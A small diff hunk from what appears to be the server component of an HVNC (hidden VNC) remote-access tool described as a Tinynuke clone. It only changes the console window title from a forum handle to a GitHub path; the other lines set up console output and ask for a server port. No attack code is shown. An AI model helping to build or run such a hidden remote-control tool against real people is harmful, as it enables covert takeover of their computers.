@@ -19,7 +19,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
 
-   SetConsoleTitle(TEXT("HVNC - Tinynuke Clone [Melted@HF]"));
+   SetConsoleTitle(TEXT("HVNC - github.com/Meltedd/HVNC"));
 
    std::cout << "[!] Server Port: ";
    std::cin >> port;
